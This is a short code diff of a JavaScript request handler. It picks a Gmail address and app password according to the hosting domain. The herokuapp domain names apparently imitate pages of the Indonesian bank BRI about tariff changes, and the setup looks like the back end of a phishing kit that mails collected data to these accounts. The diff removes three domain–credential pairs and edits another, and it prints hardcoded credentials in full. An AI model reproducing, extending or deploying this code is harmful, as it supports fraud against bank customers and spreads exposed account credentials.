@@ -31,29 +31,11 @@ export default function handler(req, res) {
        pass = 'xqljxywsozjuyizw'
     }else
     
-    if (url == 'pilih-tarif-baru-bri.herokuapp.com'){
-
-       email = 'kitelaju15@gmail.com'
-       pass = 'ioptnjslhdfjwhzs'
-    }else
-    
-    if (url == 'pilihan-tarifbri-baru.herokuapp.com'){
-
-       email = 'naldona29@gmail.com'
-       pass = 'zwtjswudhjbwvcnp'
-    }else
-    
-    if (url == 'pilih-tarifbaru.herokuapp.com'){
-
-       email = 'lajuga80@gmail.com'
-       pass = 'rcglijclmkzofcvm'
-    }else
-    
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
 
         email = 'suksesk541@gmail.com'; //email
-        pass = 'stpqngfmbqh'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'stpqfmbqh'; //sandi aplikasi dari verifikasi 2 langkah
         
 
     }
